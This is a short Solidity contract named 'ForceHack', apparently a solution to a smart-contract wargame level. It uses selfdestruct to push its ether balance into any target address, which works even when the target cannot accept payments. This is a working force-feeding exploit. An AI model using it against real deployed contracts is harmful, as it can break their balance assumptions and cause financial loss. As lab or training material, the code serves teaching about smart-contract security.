// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {

    constructor() payable {
        
    }

    function forceTransaction(address payable _to) external {
        selfdestruct(_to);
    }

}